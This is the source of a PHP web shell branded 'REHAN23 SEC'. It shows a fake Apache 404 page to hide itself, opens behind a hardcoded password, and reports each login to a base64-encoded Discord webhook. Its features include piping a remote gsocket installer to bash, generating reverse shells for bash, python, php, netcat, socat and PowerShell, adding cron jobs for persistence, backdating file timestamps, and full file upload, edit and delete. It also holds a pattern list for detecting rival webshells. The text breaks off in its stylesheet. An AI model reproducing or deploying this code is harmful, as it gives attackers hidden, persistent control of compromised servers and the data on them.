<?php
set_time_limit(0);
error_reporting(0);

// ==================== DISCORD WEBHOOK CONFIG (ENCODED) ====================
// (Ganti bagian ini di script lo)aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUzNzk4MDM4MzEwMDkyODA0MS9XZ3JEN0lDdmRFQkxrUlUyRjZxQ1l0NG0yMkVPVGdSTTlVWVF2em4tQTNCaDllWDFyXzdmOUF4a05zY2xIVG4zeTJvcA
$discord_webhook_url = '==';

// Fungsi Kirim Notifikasi ke Discord (VERSI BACKGROUND - PALING STABIL)
function sendDiscordNotification($title, $message, $color = 65280) {
    global $discord_webhook_url;
    
    // DECODE URL DARI BASE64
    $webhook = base64_decode($discord_webhook_url);
    if(empty($webhook)) return false;
    
    // SUSUN DATA JSON
    $data = [
        'embeds' => [
            [
                'title' => $title,
                'description' => $message,
                'color' => $color,
                'timestamp' => date('c'),
                'footer' => ['text' => 'REHAN23 SEC · ULTIMATE']
            ]
        ]
    ];
    $payload = json_encode($data);
    
    // SETTING CURL BACKGROUND
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    
    // FITUR PALING PENTING DI SINI: TIMEOUT 1 DETIK & BINARY TRANSFER
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1); // Cegah timeout premature di server linux
    
    // EKSEKUSI & TUTUP
    $result = curl_exec($ch);
    curl_close($ch);
    
    return true; // Dianggap sukses, gak peduli response apa pun
}

if(!isset($_GET['rehan']) && !isset($_COOKIE['_x_auth'])){
    header("HTTP/1.0 404 Not Found");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at ' . htmlspecialchars($_SERVER['HTTP_HOST']) . ' Port 80</address>
</body></html>';
    exit; // STOP PHP disini agar kode backdoor TIDAK DILOAD
}

// ==================== LOGOUT HANDLER ====================
if(isset($_GET['logout'])){
    // Hapus cookie
    setcookie('_x_auth', '', time() - 3600, '/');
    // Redirect ke halaman utama tanpa parameter rehan agar kembali ke 404
    header('Location: ' . str_replace('?logout', '', $_SERVER['REQUEST_URI']));
    exit;
}

// ==================== ACTIVATION CODE ====================
$secret_key = 'satirjawa666';
$authenticated = false;

// Cek apakah user sudah login berdasarkan Cookie
if(isset($_COOKIE['_x_auth']) && $_COOKIE['_x_auth'] === md5($secret_key.'_salt_ghost_2024')){
    $authenticated = true;
}

// Proses Login dari Form
if(isset($_POST['_k']) && $_POST['_k'] === $secret_key){
    $authenticated = true;
    setcookie('_x_auth', md5($secret_key.'_salt_ghost_2024'), time()+86400, '/');
    
    // KIRIM NOTIFIKASI KE DISCORD SAAT LOGIN BERHASIL
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';
    $time = date('Y-m-d H:i:s');
    // Ambil URL lengkap file ini
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];
    $full_url = $protocol . '://' . $host . $uri;
    
    $message = "**🟢 Success Login!**\n";
    $message .= "**IP:** `{$ip}`\n";
    $message .= "**User-Agent:** `{$ua}`\n";
    $message .= "**Time:** `{$time}`\n";
    $message .= "**🔗 URL:** [Click Here]({$full_url})";
    
    // KIRIM NOTIFIKASI
    sendDiscordNotification('🔓 ACCESS GRANTED - REHAN23 SHELL', $message, 65280);
    
    // TUNGGU 2 DETIK AGAR NOTIF TERKIRIM DENGAN SEMPURNA
    sleep(2);
    
    // Redirect ke halaman utama dengan parameter rehan=1 agar 404 palsu tidak muncul lagi
    header('Location: ?rehan=1');
    exit;
}

// ==================== ACTIVITY LOG ====================
function logActivity($action, $target = '', $status = 'success'){
    $log_file = __DIR__ . '/activity.log';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user = get_current_user();
    $time = date('Y-m-d H:i:s');
    $log_entry = "[$time] [$ip] [$user] [$action] [$target] [$status]\n";
    @file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
}

// ==================== SHELL FUNCTIONS ====================
if($authenticated):
$c = $_GET['c'] ?? getcwd();
if(isset($_GET['d'])) chdir($_GET['d']);
$f = glob("{.[!.],}*", GLOB_BRACE);

// ==================== GSOCKET INSTALL HANDLER ====================
$gsocket_output = '';
$gsocket_status = 'idle';
if(isset($_POST['install_gsocket'])){
    $gsocket_status = 'running';
    $output = [];
    $return_var = 0;
    
    $cmd1 = 'curl -Lso- gsocket.io/x | bash 2>&1';
    $cmd2 = 'bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
    
    $full_output = "🛡️ REHAN23 SEC :: GSOCKET INSTALLER\n";
    $full_output .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $full_output .= "[+] Executing: $cmd1\n";
    exec($cmd1, $out1, $ret1);
    $full_output .= implode("\n", $out1);
    if($ret1 !== 0) $full_output .= "\n[!] Command 1 returned error code: $ret1";
    
    $full_output .= "\n\n[+] Executing: $cmd2\n";
    exec($cmd2, $out2, $ret2);
    $full_output .= implode("\n", $out2);
    if($ret2 !== 0) $full_output .= "\n[!] Command 2 returned error code: $ret2";
    
    $full_output .= "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    if($ret1 === 0 && $ret2 === 0){
        $full_output .= "✅ GSOCKET INSTALLATION COMPLETED SUCCESSFULLY!";
        $gsocket_status = 'success';
    } else {
        $full_output .= "❌ GSOCKET INSTALLATION FAILED! Check output above.";
        $gsocket_status = 'error';
    }
    
    $gsocket_output = $full_output;
    logActivity('GSOCKET_INSTALL', '', $gsocket_status);
}

// ==================== SCAN MALWARE V2 (SMART DETECTION) ====================
if(isset($_POST['scan_malware'])){
    $scan_dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
    $results = [];
    
    function scanDirectorySmart($dir, $base_path = '') {
        $results = [];
        $files = scandir($dir);
        
        $critical_patterns = [
            '/\$_GET\s*\[[\'"]cmd[\'"]\]/i' => 'GET cmd (webshell)',
            '/\$_POST\s*\[[\'"]cmd[\'"]\]/i' => 'POST cmd (webshell)',
            '/\$_REQUEST\s*\[[\'"]cmd[\'"]\]/i' => 'REQUEST cmd (webshell)',
            '/\$_GET\s*\[[\'"]action[\'"]\]/i' => 'GET action (webshell)',
            '/\$_POST\s*\[[\'"]action[\'"]\]/i' => 'POST action (webshell)',
            '/c99\s*(shell|backdoor)/i' => 'c99 Backdoor',
            '/r57\s*(shell|backdoor)/i' => 'r57 Backdoor',
            '/b374k/i' => 'b374k Backdoor',
            '/webshell/i' => 'Webshell Keyword',
            '/backdoor\s*shell/i' => 'Backdoor Shell',
            '/eval\s*\(.*base64_decode/i' => 'Eval + Base64',
            '/eval\s*\(.*gzinflate/i' => 'Eval + Gzip',
            '/eval\s*\(.*str_rot13/i' => 'Eval + ROT13',
            '/eval\s*\(.*pack\s*\(/i' => 'Eval + Pack',
            '/assert\s*\(.*base64_decode/i' => 'Assert + Base64',
            '/assert\s*\(.*gzinflate/i' => 'Assert + Gzip',
            '/system\s*\(.*\$_GET/i' => 'system() + GET',
            '/exec\s*\(.*\$_GET/i' => 'exec() + GET',
            '/shell_exec\s*\(.*\$_GET/i' => 'shell_exec() + GET',
            '/passthru\s*\(.*\$_GET/i' => 'passthru() + GET',
            '/system\s*\(.*\$_POST/i' => 'system() + POST',
            '/exec\s*\(.*\$_POST/i' => 'exec() + POST',
            '/shell_exec\s*\(.*\$_POST/i' => 'shell_exec() + POST',
            '/passthru\s*\(.*\$_POST/i' => 'passthru() + POST',
            '/move_uploaded_file.*eval/i' => 'Upload + Eval',
            '/file_put_contents.*eval/i' => 'File Write + Eval',
            '/fwrite.*eval/i' => 'Fwrite + Eval',
            '/base64_decode.*\$_GET.*cmd/i' => 'Base64 + GET cmd',
            '/base64_decode.*\$_POST.*cmd/i' => 'Base64 + POST cmd',
            '/gzinflate.*\$_GET.*cmd/i' => 'Gzip + GET cmd',
            '/gzinflate.*\$_POST.*cmd/i' => 'Gzip + POST cmd',
        ];
        
        $suspicious_names = [
            'shell.php', 'cmd.php', 'backdoor.php', 'malware.php',
            'webshell.php', 'c99.php', 'r57.php', 'b374k.php',
            'adminer.php', 'dump.php', 'phpmyadmin.php', 'pma.php',
            'uploader.php', 'filemanager.php', 'explorer.php'
        ];
        
        $exclude_dirs = ['node_modules', 'vendor', '.git', '.svn', 'cache', 'temp', 'tmp', 'uploads', 'files', 'images', 'css', 'js'];
        $exclude_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mp3', '.pdf', '.zip', '.tar', '.gz', '.css', '.js', '.svg', '.ico'];
        
        foreach($files as $file){
            if($file === '.' || $file === '..') continue;
            $path = $dir . '/' . $file;
            $relative_path = $base_path ? $base_path . '/' . $file : $file;
            
            if(is_dir($path)){
                $dir_name = basename($file);
                if(in_array($dir_name, $exclude_dirs)) continue;
                $results = array_merge($results, scanDirectorySmart($path, $relative_path));
            } else {
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if(in_array('.' . $ext, $exclude_extensions)) continue;
                if(!in_array($ext, ['php', 'phtml', 'php5', 'php7', 'phps', 'inc', 'module', 'theme', 'tpl'])) continue;
                
                $content = @file_get_contents($path);
                if($content === false) continue;
                
                $detected = [];
                $score = 0;
                $is_malware = false;
                $reason = [];
                
                $basename = basename($file);
                if(in_array($basename, $suspicious_names)){
                    $is_malware = true;
                    $reason[] = "⚠️ Suspicious filename: $basename";
                    $score += 3;
                }
                
                foreach($critical_patterns as $pattern => $label){
                    if(preg_match($pattern, $content)){
                        $detected[$label] = true;
                        $score++;
                        $reason[] = "🔴 $label";
                    }
                }
                
                $is_encoded = false;
                $content_clean = preg_replace('/\s+/', '', $content);
                if(preg_match('/^[A-Za-z0-9\+\/=]{100,}$/', $content_clean) || 
                   preg_match('/^[0-9a-fA-F]{100,}$/', $content_clean)){
                    $is_encoded = true;
                    $score += 2;
                    $reason[] = "📦 Encoded content (Base64/Hex)";
                    $is_malware = true;
                }
                
                $mtime = filemtime($path);
                $time_diff = time() - $mtime;
                $is_recent = ($time_diff < 2592000);
                $is_in_webroot = (strpos($path, '/public_html') !== false || strpos($path, '/www') !== false || strpos($path, '/htdocs') !== false);
                
                if($score >= 3 || 
                   (isset($detected['GET cmd (webshell)']) || isset($detected['POST cmd (webshell)'])) ||
                   (isset($detected['Eval + Base64']) || isset($detected['Eval + Gzip']))){
                    $is_malware = true;
                }
                
                if($is_recent && $is_in_webroot && in_array($basename, $suspicious_names)){
                    $is_malware = true;
                }
                
                if($score > 0 && $is_encoded && filesize($path) > 500000){
                    $is_malware = true;
                }
                
                if(preg_match('/c99|r57|b374k|webshell|backdoor/i', $content)){
                    $is_malware = true;
                    $reason[] = "💀 Backdoor signature detected";
                }
                
                if($is_malware || $score > 0){
                    $results[] = [
                        'path' => $relative_path,
                        'full_path' => $path,
                        'detected' => $detected,
                        'score' => $score,
                        'size' => filesize($path),
                        'is_encoded' => $is_encoded,
                        'is_malware' => $is_malware,
                        'reason' => implode(' | ', array_unique($reason)),
                        'modified' => date('Y-m-d H:i:s', filemtime($path)),
                        'perms' => substr(sprintf('%o', fileperms($path)), -4),
                        'basename' => $basename
                    ];
                }
            }
        }
        return $results;
    }
    
    $results = scanDirectorySmart($scan_dir);
    
    $filtered_results = array_filter($results, function($item) {
        return ($item['score'] >= 2 || $item['is_malware'] === true);
    });
    
    usort($filtered_results, function($a, $b) {
        return $b['score'] - $a['score'];
    });
    
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'count' => count($filtered_results),
        'results' => array_values($filtered_results)
    ]);
    exit;
}

// ==================== REVERSE SHELL GENERATOR ====================
if(isset($_POST['generate_reverse_shell'])){
    $ip = $_POST['rs_ip'] ?? '127.0.0.1';
    $port = $_POST['rs_port'] ?? '4444';
    $type = $_POST['rs_type'] ?? 'bash';
    $output = '';
    $listener = '';
    
    switch($type){
        case 'bash':
            $output = "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
            $listener = "nc -lvnp {$port}";
            break;
        case 'python':
            $output = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
            $listener = "nc -lvnp {$port}";
            break;
        case 'php':
            $output = "php -r '\$sock=fsockopen(\"{$ip}\",{$port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
            $listener = "nc -lvnp {$port}";
            break;
        case 'nc':
            $output = "nc -e /bin/sh {$ip} {$port}";
            $listener = "nc -lvnp {$port}";
            break;
        case 'socat':
            $output = "socat exec:/bin/sh,pty,stderr,setsid,sigint,sane tcp:{$ip}:{$port}";
            $listener = "socat file:`tty`,raw,echo=0 tcp-listen:{$port}";
            break;
        case 'powershell':
            $output = "\$client = New-Object System.Net.Sockets.TCPClient('{$ip}',{$port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};";
            $listener = "nc -lvnp {$port}";
            break;
        default:
            $output = "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
            $listener = "nc -lvnp {$port}";
    }
    
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'command' => $output,
        'listener' => $listener,
        'type' => $type,
        'ip' => $ip,
        'port' => $port
    ]);
    exit;
}

// ==================== CRON JOB MANAGER ====================
if(isset($_POST['get_cron_jobs'])){
    $cron_output = shell_exec('crontab -l 2>&1');
    $jobs = [];
    if($cron_output && !strpos($cron_output, 'no crontab')){
        $lines = explode("\n", $cron_output);
        foreach($lines as $line){
            $line = trim($line);
            if($line && !str_starts_with($line, '#')){
                $jobs[] = $line;
            }
        }
    }
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'jobs' => $jobs,
        'raw' => $cron_output
    ]);
    exit;
}

if(isset($_POST['add_cron_job']) && isset($_POST['cron_command']) && isset($_POST['cron_schedule'])){
    $command = $_POST['cron_command'];
    $schedule = $_POST['cron_schedule'];
    $full_cron = "$schedule $command";
    $temp_file = '/tmp/cron_temp_' . uniqid();
    shell_exec("crontab -l 2>/dev/null > $temp_file");
    file_put_contents($temp_file, "\n" . $full_cron . "\n", FILE_APPEND);
    $result = shell_exec("crontab $temp_file 2>&1");
    unlink($temp_file);
    logActivity('CRON_ADD', $full_cron, $result === '' ? 'success' : 'error');
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $result === '',
        'message' => $result === '' ? '✅ Cron job added successfully!' : '❌ Failed to add cron job: ' . $result
    ]);
    exit;
}

if(isset($_POST['delete_cron_job']) && isset($_POST['cron_index'])){
    $index = intval($_POST['cron_index']);
    $temp_file = '/tmp/cron_temp_' . uniqid();
    shell_exec("crontab -l 2>/dev/null > $temp_file");
    $content = file_get_contents($temp_file);
    $lines = explode("\n", $content);
    $new_lines = [];
    $idx = 0;
    $deleted = false;
    foreach($lines as $line){
        $line_trim = trim($line);
        if($line_trim && !str_starts_with($line_trim, '#') && $idx === $index){
            $deleted = true;
            $idx++;
            continue;
        }
        if($line_trim && !str_starts_with($line_trim, '#')){
            $idx++;
        }
        $new_lines[] = $line;
    }
    file_put_contents($temp_file, implode("\n", $new_lines));
    $result = shell_exec("crontab $temp_file 2>&1");
    unlink($temp_file);
    logActivity('CRON_DELETE', "Index $index", $result === '' ? 'success' : 'error');
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $result === '' && $deleted,
        'message' => $result === '' && $deleted ? '✅ Cron job deleted!' : '❌ Failed to delete cron job.'
    ]);
    exit;
}

// ==================== FILE MANAGER HANDLERS ====================
$action_result = '';
$action_status = '';

if(isset($_POST['delete_file']) && !empty($_POST['delete_file'])){
    $target = $_POST['delete_file'];
    $result = ['success' => false, 'message' => ''];
    if(file_exists($target)){
        if(is_file($target)){
            if(unlink($target)){
                $result['success'] = true;
                $result['message'] = "✅ Deleted: " . basename($target);
                logActivity('DELETE', $target);
            } else {
                $result['message'] = "❌ Failed to delete: " . basename($target);
            }
        } elseif(is_dir($target)){
            $files = array_diff(scandir($target), ['.', '..']);
            foreach($files as $f){
                $sub = $target.'/'.$f;
                if(is_dir($sub)){
                    $sub_files = array_diff(scandir($sub), ['.', '..']);
                    foreach($sub_files as $sf){
                        @unlink($sub.'/'.$sf);
                    }
                    @rmdir($sub);
                } else {
                    @unlink($sub);
                }
            }
            if(@rmdir($target)){
                $result['success'] = true;
                $result['message'] = "✅ Deleted directory: " . basename($target);
                logActivity('DELETE_DIR', $target);
            } else {
                $result['message'] = "❌ Failed to delete directory: " . basename($target);
            }
        }
    } else {
        $result['message'] = "❌ File not found: " . basename($target);
    }
    header('Content-Type: application/json');
    echo json_encode($result);
    exit;
}

if(isset($_POST['bulk_delete']) && isset($_POST['selected_files'])){
    $selected = $_POST['selected_files'];
    if(!is_array($selected)) $selected = [$selected];
    $deleted_count = 0;
    $failed = [];
    
    foreach($selected as $file){
        $full_path = $file;
        if(file_exists($full_path)){
            if(is_file($full_path)){
                if(unlink($full_path)){$deleted_count++; logActivity('BULK_DELETE', $full_path);}
                else $failed[] = basename($full_path);
            } elseif(is_dir($full_path)){
                $files = array_diff(scandir($full_path), ['.', '..']);
                foreach($files as $f){
                    $sub = $full_path.'/'.$f;
                    if(is_dir($sub)){
                        $sub_files = array_diff(scandir($sub), ['.', '..']);
                        foreach($sub_files as $sf){
                            @unlink($sub.'/'.$sf);
                        }
                        @rmdir($sub);
                    } else {
                        @unlink($sub);
                    }
                }
                if(@rmdir($full_path)){$deleted_count++; logActivity('BULK_DELETE_DIR', $full_path);}
                else $failed[] = basename($full_path);
            }
        } else {
            $failed[] = basename($full_path);
        }
    }
    
    if($deleted_count > 0){
        $action_result = "✅ Deleted $deleted_count file(s)";
        if(!empty($failed)) $action_result .= " (failed: ".implode(', ', $failed).")";
        $action_status = 'success';
    } else {
        $action_result = "❌ Failed to delete selected files";
        $action_status = 'error';
    }
    
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_POST['create_file']) && isset($_POST['filename'])){
    $filename = trim($_POST['filename']);
    $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
    $current_dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
    $full_path = $current_dir.'/'.$filename;
    
    if(file_exists($full_path)){
        $action_result = "❌ File already exists: $filename";
        $action_status = 'error';
    } else {
        if(file_put_contents($full_path, $content)){
            $action_result = "✅ File created: $filename";
            $action_status = 'success';
            logActivity('CREATE_FILE', $full_path);
        } else {
            $action_result = "❌ Failed to create file: $filename";
            $action_status = 'error';
        }
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_GET['delete']) && !empty($_GET['delete'])){
    $target = $_GET['delete'];
    if(is_file($target)){
        if(unlink($target)){
            $action_result = "✅ Deleted file: ".basename($target);
            $action_status = 'success';
            logActivity('DELETE', $target);
        } else {
            $action_result = "❌ Failed to delete: ".basename($target);
            $action_status = 'error';
        }
    } elseif(is_dir($target)){
        $files = array_diff(scandir($target), ['.', '..']);
        foreach($files as $f){
            $sub = $target.'/'.$f;
            if(is_dir($sub)){
                $sub_files = array_diff(scandir($sub), ['.', '..']);
                foreach($sub_files as $sf){
                    @unlink($sub.'/'.$sf);
                }
                @rmdir($sub);
            } else {
                @unlink($sub);
            }
        }
        if(@rmdir($target)){
            $action_result = "✅ Deleted directory: ".basename($target);
            $action_status = 'success';
            logActivity('DELETE_DIR', $target);
        } else {
            $action_result = "❌ Failed to delete directory: ".basename($target);
            $action_status = 'error';
        }
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_POST['rename_file']) && isset($_POST['new_name'])){
    $old = $_POST['rename_file'];
    $new = dirname($old).'/'.basename($_POST['new_name']);
    if(rename($old, $new)){
        $action_result = "✅ Renamed to: ".basename($new);
        $action_status = 'success';
        logActivity('RENAME', "$old -> $new");
    } else {
        $action_result = "❌ Failed to rename";
        $action_status = 'error';
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_POST['chmod_file']) && isset($_POST['permissions'])){
    $target = $_POST['chmod_file'];
    $perms = octdec(str_pad($_POST['permissions'], 4, '0', STR_PAD_LEFT));
    if(chmod($target, $perms)){
        $action_result = "✅ Chmod updated: ".substr(sprintf('%o', fileperms($target)), -4);
        $action_status = 'success';
        logActivity('CHMOD', "$target -> $perms");
    } else {
        $action_result = "❌ Failed to change permissions";
        $action_status = 'error';
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_POST['chdate_file']) && isset($_POST['new_date'])){
    $target = $_POST['chdate_file'];
    $time = strtotime($_POST['new_date']);
    if($time && touch($target, $time)){
        $action_result = "✅ Date modified to: ".date('Y-m-d H:i:s', $time);
        $action_status = 'success';
        logActivity('CHDATE', "$target -> " . date('Y-m-d H:i:s', $time));
    } else {
        $action_result = "❌ Failed to change date";
        $action_status = 'error';
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_POST['unzip_file'])){
    $target = $_POST['unzip_file'];
    $extract_dir = dirname($target).'/'.pathinfo($target, PATHINFO_FILENAME);
    if(!is_dir($extract_dir)) mkdir($extract_dir, 0777, true);
    
    $zip = new ZipArchive();
    if($zip->open($target) === TRUE){
        $zip->extractTo($extract_dir);
        $zip->close();
        $action_result = "✅ Extracted to: ".basename($extract_dir);
        $action_status = 'success';
        logActivity('UNZIP', $target);
    } else {
        $action_result = "❌ Failed to extract zip (maybe not a zip file)";
        $action_status = 'error';
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

$edit_content = '';
$edit_file = '';
if(isset($_GET['edit']) && !empty($_GET['edit']) && is_file($_GET['edit'])){
    $edit_file = $_GET['edit'];
    if(isset($_POST['save_edit'])){
        if(file_put_contents($edit_file, $_POST['file_content'])){
            $action_result = "✅ File saved: ".basename($edit_file);
            $action_status = 'success';
            $edit_content = $_POST['file_content'];
            logActivity('EDIT_SAVE', $edit_file);
        } else {
            $action_result = "❌ Failed to save file";
            $action_status = 'error';
        }
    } else {
        $edit_content = file_get_contents($edit_file);
    }
}

if(isset($_GET['get_file_content']) && !empty($_GET['get_file_content'])){
    $file = $_GET['get_file_content'];
    if(is_file($file) && is_readable($file)){
        header('Content-Type: text/plain');
        echo file_get_contents($file);
        exit;
    } else {
        http_response_code(404);
        echo 'File not found or not readable';
        exit;
    }
}

if(isset($_POST['u']) && $_FILES['f']){
    $upload_path = isset($_GET['d']) ? $_GET['d'] : getcwd();
    $target_path = $upload_path.'/'.$_FILES['f']['name'];
    if(move_uploaded_file($_FILES['f']['tmp_name'], $target_path)){
        $action_result = "✅ Uploaded: ".$_FILES['f']['name'];
        $action_status = 'success';
        logActivity('UPLOAD', $target_path);
    } else {
        $action_result = "❌ Upload failed";
        $action_status = 'error';
    }
    $f = glob("{.[!.],}*", GLOB_BRACE);
}

if(isset($_GET['view_activity_log'])){
    $log_file = __DIR__ . '/activity.log';
    if(file_exists($log_file)){
        header('Content-Type: text/plain');
        echo file_get_contents($log_file);
        exit;
    } else {
        echo "No activity log found.";
        exit;
    }
}

if(isset($_POST['clear_activity_log'])){
    $log_file = __DIR__ . '/activity.log';
    if(file_exists($log_file)){
        unlink($log_file);
    }
    header('Content-Type: application/json');
    echo json_encode(['success' => true, 'message' => '✅ Activity log cleared!']);
    exit;
}

$f = glob("{.[!.],}*", GLOB_BRACE);
endif; // END AUTHENTICATED
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ REHAN23 SEC · ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,700;0,800;1,400&family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        /* TIDAK ADA CSS MATRIX LAGI DI SINI, MAKA TAMPILAN DEPAN MENJADI KOSONG */
        /* CSS DI BAWAH HANYA AKAN DIMUAT SAAT SUDAH LOGIN (SETELAH ?rehan= DAN PASSWORD BENAR) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font: 14px/1.6 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            background: #030308;
            color: #b8e6b8;
            min-height: 100vh;
            display: flex;
            position: relative;
            overflow: hidden;
        }

        /* ==================== LOGIN OVERLAY STYLES ==================== */
        #loginOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #0a0f0e;
            display: <?php echo ($authenticated ? 'none' : 'flex'); ?>;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            transition: opacity 0.4s ease;
        }
        .login-container {
            background: rgba(2, 5, 3, 0.9);
            border: 1px solid rgba(0, 255, 100, 0.2);
            padding: 30px 40px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 0 60px rgba(0, 255, 100, 0.08);
            backdrop-filter: blur(10px);
            min-width: 320px;
            max-width: 450px;
            width: 90%;
        }
        .login-title {
            color: #00ff66;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 4px;
            text-shadow: 0 0 20px rgba(0,255,100,0.15);
            letter-spacing: 1px;
        }
        .login-sub {
            color: #446644;
            font-size: 12px;
            margin-bottom: 25px;
            border-bottom: 1px solid rgba(0, 255, 100, 0.08);
            padding-bottom: 15px;
        }
        .login-pwd-container {
            position: relative;
            margin-bottom: 20px;
        }
        .login-input {
            width: 100%;
            background: rgba(0, 255, 100, 0.05);
            border: 1px solid rgba(0, 255, 100, 0.15);
            padding: 12px 16px;
            border-radius: 6px;
            color: #b8e6b8;
            font-family: 'JetBrains Mono', monospace;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
            text-align: center;
            letter-spacing: 2px;
        }
        .login-input:focus {
            border-color: #00ff66;
            box-shadow: 0 0 25px rgba(0,255,100,0.05);
        }
        .login-btn {
            background: rgba(0, 255, 100, 0.08);
            color: #00ff66;
            border: 1px solid rgba(0, 255, 100, 0.2);
            padding: 12px 24px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
            transition: all 0.25s;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .login-btn:hover {
            background: #00ff66;
            color: #030308;
            box-shadow: 0 0 30px rgba(0, 255, 100, 0.15);
        }
        .login-error {
            color: #ff4466;
            font-size: 12px;
            margin-top: 10px;
            display: none;
            background: rgba(204, 68, 102, 0.08);
            padding: 6px 10px;
            border-radius: 4px;
            border: 1px solid rgba(204, 68, 102, 0.1);
        }
        /* ======================================================== */

        .sidebar {
            width: 260px;
            background: rgba(5, 8, 18, 0.88);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-right: 1px solid rgba(0, 255, 100, 0.10);
            height: 100vh;
            position: relative;
            z-index: 2;
            display: <?php echo ($authenticated ? 'flex' : 'none'); ?>;
            flex-direction: column;
            padding: 28px 18px 20px;
            flex-shrink: 0;
            overflow-y: auto;
            box-shadow: 4px 0 40px rgba(0, 255, 100, 0.04);
        }
        .sidebar .brand {
            font-size: 22px;
            font-weight: 800;
            letter-spacing: -0.5px;
            color: #00ff66;
            text-shadow: 0 0 20px rgba(0, 255, 100, 0.3), 0 0 60px rgba(0, 255, 100, 0.1);
            margin-bottom: 2px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .sidebar .brand span { font-size: 18px; }
        .sidebar .brand-sub {
            font-size: 10px;
            color: #446644;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-bottom: 24px;
            padding-bottom: 18px;
            border-bottom: 1px solid rgba(0, 255, 100, 0.08);
            font-family: 'Inter', sans-serif;
        }
        .sidebar .info {
            font-size: 12px;
            color: #88aa88;
            line-height: 2.4;
            margin-bottom: 24px;
            background: rgba(0, 255, 100, 0.04);
            padding: 14px 16px;
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 100, 0.08);
            font-family: 'JetBrains Mono', monospace;
            backdrop-filter: blur(8px);
        }
        .sidebar .info span { color: #00ff66; font-weight: 700; text-shadow: 0 0 12px rgba(0,255,100,0.2); }
        .sidebar .info i { color: #66aa88; font-style: normal; }

        .nav-grid {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .nav-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0, 255, 100, 0.03);
